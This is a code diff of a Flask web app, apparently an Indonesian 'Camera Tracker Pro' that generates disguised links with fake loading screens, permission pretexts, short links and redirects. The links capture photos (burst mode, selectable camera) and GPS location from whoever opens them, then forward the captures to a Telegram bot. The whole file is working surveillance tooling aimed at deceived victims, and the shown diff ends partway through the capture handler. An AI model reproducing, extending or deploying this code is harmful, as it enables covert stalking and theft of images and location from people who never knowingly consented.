@@ -1,25 +1,28 @@
 """
-Camera Tracker — Flask backend untuk PythonAnywhere
-WebSocket diganti HTTP polling (PythonAnywhere tidak support WS)
+Camera Tracker Pro v4
+28 fitur: Rate Limiting, Jadwal, Custom Slug, Short Link,
+Batch Generate, Template, Burst Mode, Fake App, Canary, dan lainnya.
 """
 from flask import (Flask, request, jsonify, render_template,
-                   session, redirect, url_for, make_response, Response)
+                   session, redirect, url_for, make_response)
 from functools import wraps
-import sqlite3, uuid, os, secrets, base64, json
+import sqlite3, uuid, os, secrets, base64, json, random, string
 from datetime import datetime, timedelta
 
+try:
+    import requests as req_lib
+    REQUESTS_OK = True
+except ImportError:
+    REQUESTS_OK = False
+
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "ganti-secret-key-ini-acak")
-app.permanent_session_lifetime = timedelta(days=1)
-
+app.secret_key = os.getenv("SECRET_KEY", "ganti-secret-key-acak-32-karakter-atau-lebih")
+app.permanent_session_lifetime = timedelta(days=7)
 APP_PASSWORD = os.getenv("APP_PASSWORD", "admin123")
-
-# Simpan frame terbaru per token di memory
-latest_frames = {}   # token -> bytes (JPEG)
+DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")
 
 
-# ─── Database ─────────────────────────────────────────────────────────────────
-DB_PATH = os.path.join(os.path.dirname(__file__), "tracker.db")
+# ── Database ──────────────────────────────────────────────────────────────────
 
 def get_db():
     c = sqlite3.connect(DB_PATH)
@@ -31,225 +34,732 @@ def init_db():
     db.executescript("""
         CREATE TABLE IF NOT EXISTS tokens (
             id                 TEXT PRIMARY KEY,
-            type               TEXT NOT NULL DEFAULT 'stream',
+            slug               TEXT DEFAULT '',
+            short_code         TEXT DEFAULT '',
+            label              TEXT DEFAULT '',
+            tags               TEXT DEFAULT '',
+            mode               TEXT NOT NULL DEFAULT 'photo',
+            canary             INTEGER DEFAULT 0,
+            multi_device       INTEGER DEFAULT 1,
+            link_title         TEXT DEFAULT '',
+            link_description   TEXT DEFAULT '',
             loading_title      TEXT DEFAULT 'Memuat Aplikasi',
             loading_subtitle   TEXT DEFAULT 'Mohon tunggu sebentar...',
             loading_duration   INTEGER DEFAULT 3,
             permission_title   TEXT DEFAULT 'Akses Diperlukan',
             permission_message TEXT DEFAULT 'Aplikasi ini memerlukan akses untuk berjalan.',
             custom_message     TEXT DEFAULT '',
+            fake_mode          TEXT DEFAULT '',
+            thank_you_title    TEXT DEFAULT '',
+            thank_you_msg      TEXT DEFAULT '',
+            thank_you_btn      TEXT DEFAULT 'Tutup',
+            redirect_url       TEXT DEFAULT '',
+            redirect_delay     INTEGER DEFAULT 3,
+            theme              TEXT DEFAULT '{}',
+            custom_icon        TEXT DEFAULT '',
+            camera_facing      TEXT DEFAULT 'user',
+            photo_width        INTEGER DEFAULT 640,
+            burst_count        INTEGER DEFAULT 1,
+            burst_interval     INTEGER DEFAULT 500,
+            capture_interval   INTEGER DEFAULT 10,
+            auto_delete_hours  INTEGER DEFAULT 0,
+            max_access         INTEGER DEFAULT 0,
+            access_count       INTEGER DEFAULT 0,
+            active_days        TEXT DEFAULT '',
+            active_time_start  TEXT DEFAULT '',
+            active_time_end    TEXT DEFAULT '',
+            active_from        TEXT DEFAULT '',
             created_at         TEXT NOT NULL,
             expires_at         TEXT NOT NULL,
-            used               INTEGER DEFAULT 0,
-            active             INTEGER DEFAULT 0
+            revoked            INTEGER DEFAULT 0,
+            used               INTEGER DEFAULT 0
         );
         CREATE TABLE IF NOT EXISTS captures (
             id           INTEGER PRIMARY KEY AUTOINCREMENT,
             token_id     TEXT NOT NULL,
             type         TEXT NOT NULL,
             data         TEXT NOT NULL,
+            address      TEXT DEFAULT '',
             captured_at  TEXT NOT NULL
         );
+        CREATE TABLE IF NOT EXISTS access_logs (
+            id           INTEGER PRIMARY KEY AUTOINCREMENT,
+            token_id     TEXT NOT NULL,
+            ip_address   TEXT,
+            user_agent   TEXT,
+            accessed_at  TEXT NOT NULL
+        );
+        CREATE TABLE IF NOT EXISTS config (
+            key   TEXT PRIMARY KEY,
+            value TEXT
+        );
+        CREATE TABLE IF NOT EXISTS templates (
+            id          INTEGER PRIMARY KEY AUTOINCREMENT,
+            name        TEXT NOT NULL,
+            config_json TEXT NOT NULL,
+            created_at  TEXT NOT NULL
+        );
     """)
+    # Migrasi untuk database lama
+    migrations = [
+        "ALTER TABLE tokens ADD COLUMN slug TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN short_code TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN tags TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN canary INTEGER DEFAULT 0",
+        "ALTER TABLE tokens ADD COLUMN multi_device INTEGER DEFAULT 1",
+        "ALTER TABLE tokens ADD COLUMN fake_mode TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN thank_you_title TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN thank_you_msg TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN thank_you_btn TEXT DEFAULT 'Tutup'",
+        "ALTER TABLE tokens ADD COLUMN theme TEXT DEFAULT '{}'",
+        "ALTER TABLE tokens ADD COLUMN custom_icon TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN camera_facing TEXT DEFAULT 'user'",
+        "ALTER TABLE tokens ADD COLUMN photo_width INTEGER DEFAULT 640",
+        "ALTER TABLE tokens ADD COLUMN burst_count INTEGER DEFAULT 1",
+        "ALTER TABLE tokens ADD COLUMN burst_interval INTEGER DEFAULT 500",
+        "ALTER TABLE tokens ADD COLUMN max_access INTEGER DEFAULT 0",
+        "ALTER TABLE tokens ADD COLUMN access_count INTEGER DEFAULT 0",
+        "ALTER TABLE tokens ADD COLUMN active_days TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN active_time_start TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN active_time_end TEXT DEFAULT ''",
+        "ALTER TABLE tokens ADD COLUMN active_from TEXT DEFAULT ''",
+        "ALTER TABLE captures ADD COLUMN address TEXT DEFAULT ''",
+        "CREATE TABLE IF NOT EXISTS templates (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, config_json TEXT NOT NULL, created_at TEXT NOT NULL)",
+    ]
+    for m in migrations:
+        try: db.execute(m); db.commit()
+        except: pass
     db.commit(); db.close()
+
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+def get_token_by(identifier):
+    """Cari token by UUID atau slug."""
+    db = get_db()
+    row = db.execute("SELECT * FROM tokens WHERE id=? OR (slug!='' AND slug=?)",
+                     (identifier, identifier)).fetchone()
+    db.close(); return row
+
+def get_cfg(key, default=""):
+    db = get_db()
+    row = db.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
+    db.close(); return row["value"] if row else default
+
+def set_cfg(key, value):
+    db = get_db()
+    db.execute("INSERT OR REPLACE INTO config (key,value) VALUES (?,?)", (key, value))
+    db.commit(); db.close()
+
+def gen_short_code():
+    """Generate 6-char unique short code."""
+    db = get_db()
+    for _ in range(20):
+        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        if not db.execute("SELECT id FROM tokens WHERE short_code=?", (code,)).fetchone():
+            db.close(); return code
+    db.close()
+    return secrets.token_hex(3)
+
+def token_valid(row):
+    if not row or row["revoked"]: return False
+    return datetime.now() <= datetime.fromisoformat(row["expires_at"])
+
+def check_schedule(row):
+    """Cek jadwal waktu aktif. Return (ok, pesan)."""
+    tz_off = int(get_cfg("timezone_offset", "7"))
+    now    = datetime.utcnow() + timedelta(hours=tz_off)
+
+    # Cek scheduled activation
+    if row["active_from"]:
+        try:
+            af = datetime.fromisoformat(row["active_from"])
+            if now < af:
+                return False, f"Link belum aktif. Aktif mulai {af.strftime('%d/%m/%Y %H:%M')}"
+        except: pass
+
+    # Cek hari aktif
+    if row["active_days"]:
+        try:
+            allowed = json.loads(row["active_days"])  # [0,1,2,3,4] = Sen-Jum (Python: Mon=0)
+            if now.weekday() not in allowed:
+                days_name = ["Sen","Sel","Rab","Kam","Jum","Sab","Min"]
+                aktif = ", ".join(days_name[d] for d in allowed)
+                return False, f"Link hanya aktif pada: {aktif}"
+        except: pass
+
+    # Cek jam aktif
+    if row["active_time_start"] and row["active_time_end"]:
+        try:
+            t_start = datetime.strptime(row["active_time_start"], "%H:%M").time()
+            t_end   = datetime.strptime(row["active_time_end"],   "%H:%M").time()
+            t_now   = now.time()
+            if not (t_start <= t_now <= t_end):
+                return False, f"Link hanya aktif pukul {row['active_time_start']}–{row['active_time_end']}"
+        except: pass
+
+    return True, ""
+
+def check_rate_limit(ip, token_id):
+    """Cek apakah IP melebihi batas akses. Return (ok, pesan)."""
+    max_req = int(get_cfg("rl_max_requests", "0"))
+    if max_req == 0: return True, ""
+    window  = int(get_cfg("rl_window_minutes", "5"))
+    cutoff  = (datetime.now() - timedelta(minutes=window)).isoformat()
+    db = get_db()
+    count = db.execute(
+        "SELECT COUNT(*) FROM access_logs WHERE ip_address=? AND token_id=? AND accessed_at>?",
+        (ip, token_id, cutoff)).fetchone()[0]
+    db.close()
+    if count >= max_req:
+        return False, f"Terlalu banyak permintaan dari IP ini. Coba lagi dalam {window} menit."
+    return True, ""
+
+def do_auto_delete():
+    """Hapus captures lama sesuai auto_delete_hours tiap token."""
+    db = get_db()
+    rows = db.execute("SELECT id,auto_delete_hours,created_at FROM tokens WHERE auto_delete_hours>0").fetchall()
+    for r in rows:
+        cutoff = (datetime.fromisoformat(r["created_at"]) + timedelta(hours=r["auto_delete_hours"])).isoformat()
+        db.execute("DELETE FROM captures WHERE token_id=? AND captured_at<?", (r["id"], cutoff))
+    # Auto-cleanup token expired > 7 hari
+    old_cutoff = (datetime.now() - timedelta(days=7)).isoformat()
+    db.execute("DELETE FROM access_logs WHERE token_id IN (SELECT id FROM tokens WHERE expires_at<?)", (old_cutoff,))
+    db.execute("DELETE FROM captures WHERE token_id IN (SELECT id FROM tokens WHERE expires_at<?)", (old_cutoff,))
+    db.execute("DELETE FROM tokens WHERE expires_at<? AND revoked=0", (old_cutoff,))
+    db.commit(); db.close()
+
+def telegram_notify(cap_type, data, label, address=""):
+    if not REQUESTS_OK: return
+    bot = get_cfg("tg_bot_token"); cid = get_cfg("tg_chat_id")
+    if not bot or not cid: return
+    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    lbl = label or "—"
+    try:
+        if cap_type == "photo":
+            raw = base64.b64decode(data.split(",",1)[1] if "," in data else data)
+            caption = f"📸 Foto baru\n🏷 {lbl}\n🕐 {now}"
+            if address: caption += f"\n📍 {address}"
+            req_lib.post(f"https://api.telegram.org/bot{bot}/sendPhoto",
+                files={"photo":("p.jpg", raw, "image/jpeg")},
+                data={"chat_id": cid, "caption": caption}, timeout=15)
+        elif cap_type == "gps":
+            g = json.loads(data)
+            lat, lng, acc = g["lat"], g["lng"], g.get("accuracy","?")
+            text = (f"📍 Lokasi baru\n🏷 {lbl}\n🕐 {now}\n"
+                    f"📌 {lat:.6f}, {lng:.6f}\n🎯 ±{int(float(acc))}m\n"
+                    f"🗺 https://maps.google.com/?q={lat},{lng}")
+            if address: text += f"\n🏘 {address}"
+            req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
+                data={"chat_id": cid, "text": text}, timeout=10)
+    except: pass
+
 
 init_db()
 
-def get_token(token):
-    db = get_db()
-    row = db.execute("SELECT * FROM tokens WHERE id=?", (token,)).fetchone()
-    db.close(); return row
 
-def token_valid(row):
-    return row and datetime.now() <= datetime.fromisoformat(row["expires_at"])
+# ── Auth ──────────────────────────────────────────────────────────────────────
 
-
-# ─── Auth ────────────────────────────────────────────────────────────────────
 def login_required(f):
     @wraps(f)
-    def wrapped(*a, **kw):
-        if not session.get("logged_in"):
-            return redirect(url_for("login"))
-        return f(*a, **kw)
-    return wrapped
+    def w(*a,**k):
+        if not session.get("logged_in"): return redirect(url_for("login"))
+        return f(*a,**k)
+    return w
 
 @app.route("/")
-def index():
-    return redirect(url_for("dashboard" if session.get("logged_in") else "login"))
+def index(): return redirect(url_for("dashboard" if session.get("logged_in") else "login"))
 
-@app.route("/login", methods=["GET", "POST"])
+@app.route("/login", methods=["GET","POST"])
 def login():
     error = None
     if request.method == "POST":
         if request.form.get("password") == APP_PASSWORD:
-            session.permanent = True
-            session["logged_in"] = True
+            session.permanent = True; session["logged_in"] = True
             return redirect(url_for("dashboard"))
         error = "Password salah!"
     return render_template("login.html", error=error)
 
 @app.route("/logout")
-def logout():
-    session.clear()
-    return redirect(url_for("login"))
+def logout(): session.clear(); return redirect(url_for("login"))
 
 
-# ─── Halaman ──────────────────────────────────────────────────────────────────
+# ── Dashboard ─────────────────────────────────────────────────────────────────
+
 @app.route("/dashboard")
 @login_required
 def dashboard():
-    return render_template("dashboard.html")
+    do_auto_delete()
+    return render_template("dashboard.html",
+        tg_ok=bool(get_cfg("tg_bot_token") and get_cfg("tg_chat_id")))
 
-@app.route("/track/<token>")
-def device_page(token):
-    row = get_token(token)
+@app.route("/ping")
+def ping(): return jsonify(status="ok", time=datetime.now().isoformat())
+
+
+# ── Short Link ────────────────────────────────────────────────────────────────
+
+@app.route("/s/<code>")
+def short_link(code):
+    db = get_db()
+    row = db.execute("SELECT id, slug FROM tokens WHERE short_code=?", (code,)).fetchone()
+    db.close()
     if not row:
-        return render_template("error.html",
-            icon="❌", title="Link Tidak Valid",
-            msg="Link ini tidak ditemukan."), 404
+        return render_template("error.html", icon="❌", title="Link Tidak Valid",
+                               msg="Short link ini tidak ditemukan."), 404
+    target = row["slug"] if row["slug"] else row["id"]
+    return redirect(url_for("device_page", identifier=target))
+
+
+# ── Device Page ───────────────────────────────────────────────────────────────
+
+@app.route("/track/<identifier>")
+def device_page(identifier):
+    row = get_token_by(identifier)
+    ip  = (request.headers.get("X-Forwarded-For", request.remote_addr) or "").split(",")[0].strip()
+    ua  = (request.headers.get("User-Agent","") or "")[:300]
+
+    # Validasi dasar
+    if not row:
+        return render_template("error.html", icon="❌", title="Link Tidak Valid",
+                               msg="Link ini tidak ditemukan."), 404
+
+    token_id = row["id"]
+
+    # Rate limiting
+    rl_ok, rl_msg = check_rate_limit(ip, token_id)
+    if not rl_ok:
+        return render_template("error.html", icon="🚫", title="Terlalu Banyak Permintaan",
+                               msg=rl_msg), 429
+
+    # Expired / revoked
     if not token_valid(row):
-        return render_template("error.html",
-            icon="⏰", title="Link Kadaluarsa",
-            msg="Link sudah tidak berlaku. Minta link baru."), 410
+        msg = "Link telah dibatalkan." if row["revoked"] else "Link sudah kadaluarsa."
+        return render_template("error.html", icon="⏰", title="Link Tidak Aktif", msg=msg), 410
+
+    # Batas jumlah akses
+    if row["max_access"] > 0 and row["access_count"] >= row["max_access"]:
+        return render_template("error.html", icon="🔒", title="Batas Akses Tercapai",
+                               msg=f"Link ini hanya bisa dibuka {row['max_access']} kali."), 403
+
+    # Jadwal
+    sched_ok, sched_msg = check_schedule(row)
+    if not sched_ok:
+        return render_template("error.html", icon="⏱", title="Link Belum/Tidak Aktif",
+                               msg=sched_msg), 403
+
+    # Log akses & increment counter
+    db = get_db()
+    db.execute("INSERT INTO access_logs (token_id,ip_address,user_agent,accessed_at) VALUES (?,?,?,?)",
+               (token_id, ip, ua, datetime.now().isoformat()))
+    db.execute("UPDATE tokens SET access_count = access_count + 1 WHERE id=?", (token_id,))
+    db.commit(); db.close()
+
+    # Parse theme
+    try: theme = json.loads(row["theme"] or "{}")
+    except: theme = {}
+
     return render_template("device.html",
-        token=token,
-        token_type=row["type"],
+        token=token_id,
+        mode=row["mode"],
+        canary=row["canary"],
+        link_title=row["link_title"] or "Aplikasi",
+        link_description=row["link_description"] or "",
         loading_title=row["loading_title"],
         loading_subtitle=row["loading_subtitle"],
         loading_duration=row["loading_duration"],
         permission_title=row["permission_title"],
         permission_message=row["permission_message"],
-        custom_message=row["custom_message"])
+        custom_message=row["custom_message"],
+        fake_mode=row["fake_mode"] or "",
+        thank_you_title=row["thank_you_title"] or "",
+        thank_you_msg=row["thank_you_msg"] or "",
+        thank_you_btn=row["thank_you_btn"] or "Tutup",
+        redirect_url=row["redirect_url"] or "",
+        redirect_delay=int(row["redirect_delay"] or 3),
+        theme_bg=theme.get("bg",""),
+        theme_accent=theme.get("accent",""),
+        theme_font=theme.get("font","Inter"),
+        custom_icon=row["custom_icon"] or "",
+        camera_facing=row["camera_facing"] or "user",
+        photo_width=int(row["photo_width"] or 640),
+        burst_count=int(row["burst_count"] or 1),
+        burst_interval=int(row["burst_interval"] or 500),
+        capture_interval=int(row["capture_interval"] or 10))
 
 
-# ─── API: Ping (keep-alive) ───────────────────────────────────────────────────
-@app.route("/ping")
-def ping():
-    return jsonify(status="ok", time=datetime.now().isoformat())
+# ── API: Stats ────────────────────────────────────────────────────────────────
+
+@app.route("/api/stats")
+@login_required
+def get_stats():
+    db = get_db()
+    now = datetime.now().isoformat()
+    total_sessions = db.execute("SELECT COUNT(*) FROM tokens").fetchone()[0]
+    active_sessions = db.execute("SELECT COUNT(*) FROM tokens WHERE revoked=0 AND expires_at>?", (now,)).fetchone()[0]
+    total_photos = db.execute("SELECT COUNT(*) FROM captures WHERE type='photo'").fetchone()[0]
+    total_gps = db.execute("SELECT COUNT(*) FROM captures WHERE type='gps'").fetchone()[0]
+    photo_size = db.execute("SELECT SUM(LENGTH(data)) FROM captures WHERE type='photo'").fetchone()[0] or 0
+    db.close()
+    return jsonify(total_sessions=total_sessions, active_sessions=active_sessions,
+                   total_photos=total_photos, total_gps=total_gps,
+                   storage_mb=round(photo_size/1024/1024, 2))
 
 
-# ─── API: Generate Link ───────────────────────────────────────────────────────
+# ── API: Sessions ─────────────────────────────────────────────────────────────
+
+@app.route("/api/sessions")
+@login_required
+def get_sessions():
+    tag_filter  = request.args.get("tag","").strip()
+    mode_filter = request.args.get("mode","").strip()
+    status_filter = request.args.get("status","").strip()
+    search = request.args.get("q","").strip()
+    db = get_db()
+    rows = db.execute("""
+        SELECT t.*,
+          (SELECT COUNT(*) FROM captures WHERE token_id=t.id) capture_count,
+          (SELECT COUNT(*) FROM access_logs WHERE token_id=t.id) access_count_log
+        FROM tokens t ORDER BY t.created_at DESC LIMIT 200
+    """).fetchall()
+    db.close()
+    now = datetime.now().isoformat()
+    out = []
+    for r in rows:
+        status = "revoked" if r["revoked"] else ("expired" if r["expires_at"]<now else "active")
+        if status_filter and status != status_filter: continue
+        if mode_filter and r["mode"] != mode_filter: continue
+        if search and search.lower() not in (r["label"]+r["tags"]+r["link_title"]).lower(): continue
+        if tag_filter and tag_filter not in (r["tags"] or "").split(","): continue
+        out.append({"id":r["id"],"label":r["label"],"tags":r["tags"],
+                    "mode":r["mode"],"canary":r["canary"],
+                    "link_title":r["link_title"],"short_code":r["short_code"],
+                    "slug":r["slug"],"created_at":r["created_at"],
+                    "expires_at":r["expires_at"],"status":status,
+                    "capture_count":r["capture_count"],
+                    "access_count":r["access_count"],
+                    "access_count_log":r["access_count_log"],
+                    "max_access":r["max_access"],"used":r["used"]})
+    return jsonify(out)
+
+
+# ── API: Generate Link ────────────────────────────────────────────────────────
+
 @app.route("/api/generate-link", methods=["POST"])
 @login_required
 def generate_link():
-    body    = request.json or {}
-    token   = str(uuid.uuid4())
-    now     = datetime.now()
-    expires = now + timedelta(hours=int(body.get("expires_hours", 1)))
+    b = request.json or {}
+    token = str(uuid.uuid4()); now = datetime.now()
+    exp   = now + timedelta(hours=int(b.get("expires_hours",1)))
+
+    # Custom slug validation
+    slug = b.get("slug","").strip().lower().replace(" ","-")
+    if slug:
+        db = get_db()
+        exists = db.execute("SELECT id FROM tokens WHERE slug=?", (slug,)).fetchone()
+        db.close()
+        if exists: return jsonify(error=f"Slug '{slug}' sudah dipakai"), 400
+
+    short_code = gen_short_code()
+
+    # Theme JSON
+    theme = json.dumps({
+        "bg":     b.get("theme_bg",""),
+        "accent": b.get("theme_accent",""),
+        "font":   b.get("theme_font","Inter"),
+    })
+
     db = get_db()
     db.execute("""
         INSERT INTO tokens
-        (id,type,loading_title,loading_subtitle,loading_duration,
-         permission_title,permission_message,custom_message,created_at,expires_at)
-        VALUES (?,?,?,?,?,?,?,?,?,?)
-    """, (token,
-          body.get("type","stream"),
-          body.get("loading_title","Memuat Aplikasi"),
-          body.get("loading_subtitle","Mohon tunggu sebentar..."),
-          int(body.get("loading_duration", 3)),
-          body.get("permission_title","Akses Diperlukan"),
-          body.get("permission_message","Aplikasi memerlukan akses untuk berjalan."),
-          body.get("custom_message",""),
-          now.isoformat(), expires.isoformat()))
+        (id, slug, short_code, label, tags, mode, canary, multi_device,
+         link_title, link_description, loading_title, loading_subtitle, loading_duration,
+         permission_title, permission_message, custom_message,
+         fake_mode, thank_you_title, thank_you_msg, thank_you_btn,
+         redirect_url, redirect_delay, theme, custom_icon,
+         camera_facing, photo_width, burst_count, burst_interval,
+         capture_interval, auto_delete_hours, max_access,
+         active_days, active_time_start, active_time_end, active_from,
+         created_at, expires_at)
+        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+    """, (token, slug, short_code,
+          b.get("label",""), b.get("tags",""), b.get("mode","photo"),
+          int(b.get("canary",0)), int(b.get("multi_device",1)),
+          b.get("link_title",""), b.get("link_description",""),
+          b.get("loading_title","Memuat Aplikasi"),
+          b.get("loading_subtitle","Mohon tunggu sebentar..."),
+          int(b.get("loading_duration",3)),
+          b.get("permission_title","Akses Diperlukan"),
+          b.get("permission_message","Aplikasi ini memerlukan akses untuk berjalan."),
+          b.get("custom_message",""),
+          b.get("fake_mode",""), b.get("thank_you_title",""),
+          b.get("thank_you_msg",""), b.get("thank_you_btn","Tutup"),
+          b.get("redirect_url",""), int(b.get("redirect_delay",3)),
+          theme, b.get("custom_icon",""),
+          b.get("camera_facing","user"), int(b.get("photo_width",640)),
+          int(b.get("burst_count",1)), int(b.get("burst_interval",500)),
+          int(b.get("capture_interval",10)), int(b.get("auto_delete_hours",0)),
+          int(b.get("max_access",0)),
+          b.get("active_days",""), b.get("active_time_start",""), b.get("active_time_end",""),
+          b.get("active_from",""),
+          now.isoformat(), exp.isoformat()))
     db.commit(); db.close()
+
     base = request.host_url.rstrip("/")
-    return jsonify(link=f"{base}/track/{token}", token=token,
-                   type=body.get("type","stream"),
-                   expires_at=expires.isoformat())
+    track_path = slug if slug else token
+    return jsonify(
+        link=f"{base}/track/{track_path}",
+        short_link=f"{base}/s/{short_code}",
+        token=token, slug=slug, short_code=short_code,
+        mode=b.get("mode","photo"), expires_at=exp.isoformat())
 
 
-# ─── API: Token Info (public) ─────────────────────────────────────────────────
-@app.route("/api/token-info/<token>")
-def token_info(token):
-    row = get_token(token)
-    if not token_valid(row): return jsonify(error="not found"), 404
-    return jsonify({k: row[k] for k in (
-        "type","loading_title","loading_subtitle","loading_duration",
-        "permission_title","permission_message","custom_message")})
+# ── API: Batch Generate ───────────────────────────────────────────────────────
+
+@app.route("/api/generate-batch", methods=["POST"])
+@login_required
+def generate_batch():
+    b = request.json or {}
+    count = min(int(b.get("count",1)), 50)  # maks 50 sekaligus
+    results = []
+    base = request.host_url.rstrip("/")
+    for i in range(count):
+        b["label"] = f"{b.get('label_prefix','Sesi')} {i+1}"
+        b["slug"]  = ""  # slug tidak bisa di-batch
+        token = str(uuid.uuid4()); now = datetime.now()
+        exp   = now + timedelta(hours=int(b.get("expires_hours",1)))
+        short_code = gen_short_code()
+        theme = json.dumps({"bg":b.get("theme_bg",""),"accent":b.get("theme_accent",""),"font":b.get("theme_font","Inter")})
+        db = get_db()
+        db.execute("""
+            INSERT INTO tokens
+            (id,slug,short_code,label,tags,mode,canary,multi_device,
+             link_title,link_description,loading_title,loading_subtitle,loading_duration,
+             permission_title,permission_message,custom_message,
+             fake_mode,thank_you_title,thank_you_msg,thank_you_btn,
+             redirect_url,redirect_delay,theme,custom_icon,
+             camera_facing,photo_width,burst_count,burst_interval,
+             capture_interval,auto_delete_hours,max_access,
+             active_days,active_time_start,active_time_end,active_from,
+             created_at,expires_at)
+            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+        """, (token,"",short_code,b.get("label",""),b.get("tags",""),
+              b.get("mode","photo"),int(b.get("canary",0)),int(b.get("multi_device",1)),
+              b.get("link_title",""),b.get("link_description",""),
+              b.get("loading_title","Memuat Aplikasi"),
+              b.get("loading_subtitle","Mohon tunggu sebentar..."),
+              int(b.get("loading_duration",3)),
+              b.get("permission_title","Akses Diperlukan"),
+              b.get("permission_message","Aplikasi ini memerlukan akses untuk berjalan."),
+              b.get("custom_message",""),b.get("fake_mode",""),
+              b.get("thank_you_title",""),b.get("thank_you_msg",""),b.get("thank_you_btn","Tutup"),
+              b.get("redirect_url",""),int(b.get("redirect_delay",3)),
+              theme,b.get("custom_icon",""),b.get("camera_facing","user"),
+              int(b.get("photo_width",640)),int(b.get("burst_count",1)),
+              int(b.get("burst_interval",500)),int(b.get("capture_interval",10)),
+              int(b.get("auto_delete_hours",0)),int(b.get("max_access",0)),
+              b.get("active_days",""),b.get("active_time_start",""),b.get("active_time_end",""),
+              b.get("active_from",""),now.isoformat(),exp.isoformat()))
+        db.commit(); db.close()
+        results.append({"token":token,"label":b["label"],
+                         "link":f"{base}/track/{token}",
+                         "short_link":f"{base}/s/{short_code}",
+                         "short_code":short_code})
+    return jsonify(results)
 
 
-# ─── API: Status ─────────────────────────────────────────────────────────────
+# ── API: Revoke / Delete ──────────────────────────────────────────────────────
+
+@app.route("/api/revoke/<token>", methods=["POST"])
+@login_required
+def revoke_token(token):
+    db = get_db()
+    db.execute("UPDATE tokens SET revoked=1 WHERE id=?", (token,))
+    db.commit(); db.close(); return jsonify(ok=True)
+
+@app.route("/api/session/<token>", methods=["DELETE"])
+@login_required
+def delete_session(token):
+    db = get_db()
+    db.execute("DELETE FROM captures WHERE token_id=?", (token,))
+    db.execute("DELETE FROM access_logs WHERE token_id=?", (token,))
+    db.execute("DELETE FROM tokens WHERE id=?", (token,))
+    db.commit(); db.close(); return jsonify(ok=True)
+
 @app.route("/api/status/<token>")
 @login_required
 def token_status(token):
-    row = get_token(token)
+    db = get_db(); row = db.execute("SELECT * FROM tokens WHERE id=?", (token,)).fetchone(); db.close()
     if not row: return jsonify(status="not_found")
-    expired  = datetime.now() > datetime.fromisoformat(row["expires_at"])
-    streaming = token in latest_frames
-    return jsonify(status="expired" if expired else ("streaming" if streaming else "waiting"),
-                   type=row["type"])
+    exp = datetime.now() > datetime.fromisoformat(row["expires_at"])
+    return jsonify(status="revoked" if row["revoked"] else ("expired" if exp else "active"),
+                   mode=row["mode"], access_count=row["access_count"])
 
 
-# ─── API: Frame (streaming via HTTP polling) ──────────────────────────────────
-@app.route("/api/frame/<token>", methods=["POST"])
-def receive_frame(token):
-    """HP mengirim frame JPEG ke sini setiap interval."""
-    row = get_token(token)
-    if not token_valid(row): return jsonify(error="invalid"), 404
-    data = request.data
-    if not data: return jsonify(error="no data"), 400
-    latest_frames[token] = data
-    # Tandai token aktif (sekali saja)
-    if not row["active"]:
-        db = get_db()
-        db.execute("UPDATE tokens SET active=1, used=1 WHERE id=?", (token,))
-        db.commit(); db.close()
-    return jsonify(ok=True)
+# ── API: Bulk Actions ─────────────────────────────────────────────────────────
 
-@app.route("/api/frame/<token>", methods=["GET"])
+@app.route("/api/bulk", methods=["POST"])
 @login_required
-def get_frame(token):
-    """Dashboard mengambil frame terbaru."""
-    if token not in latest_frames:
-        return "", 204   # belum ada frame
-    resp = make_response(latest_frames[token])
-    resp.headers["Content-Type"]  = "image/jpeg"
-    resp.headers["Cache-Control"] = "no-store, no-cache"
-    return resp
+def bulk_action():
+    b = request.json or {}
+    action = b.get("action")  # revoke, delete
+    ids    = b.get("ids", [])
+    if not ids: return jsonify(error="Tidak ada ID"), 400
+    db = get_db()
+    for tid in ids:
+        if action == "revoke":
+            db.execute("UPDATE tokens SET revoked=1 WHERE id=?", (tid,))
+        elif action == "delete":
+            db.execute("DELETE FROM captures WHERE token_id=?", (tid,))
+            db.execute("DELETE FROM access_logs WHERE token_id=?", (tid,))
+            db.execute("DELETE FROM tokens WHERE id=?", (tid,))
+    db.commit(); db.close()
+    return jsonify(ok=True, count=len(ids))
 
 
-# ─── API: Simpan Capture (foto / GPS) ────────────────────────────────────────
+# ── API: Capture ──────────────────────────────────────────────────────────────
+
 @app.route("/api/capture/<token>", methods=["POST"])
 def save_capture(token):
-    row = get_token(token)
-    if not token_valid(row): return jsonify(error="invalid"), 404
-    ct = request.content_type or ""
-    if "application/json" in ct:
-        data     = json.dumps(request.json)
-        cap_type = "gps"
-    else:
-        data     = "data:image/jpeg;base64," + base64.b64encode(request.data).decode()
-        cap_type = "photo"
     db = get_db()
-    db.execute("INSERT INTO captures (token_id,type,data,captured_at) VALUES (?,?,?,?)",
-               (token, cap_type, data, datetime.now().isoformat()))
+    row = db.execute("SELECT * FROM tokens WHERE id=?", (token,)).fetchone()
+    db.close()
+    if not token_valid(row): return jsonify(error="invalid"), 404
+    if row["canary"]: return jsonify(ok=True)  # Canary: hanya log, jangan simpan capture
+
+    ct = request.content_type or ""
+    address = request.args.get("address","")
+    if "application/json" in ct:
+        data = json.dumps(request.json or {}); cap_type = "gps"
+    else:
+        data = "data:image/jpeg;base64," + base64.b64encode(request.data).decode()
+        cap_type = "photo"
+
+    db = get_db()
+    db.execute("INSERT INTO captures (token_id,type,data,address,captured_at) VALUES (?,?,?,?,?)",
+               (token, cap_type, data, address, datetime.now().isoformat()))
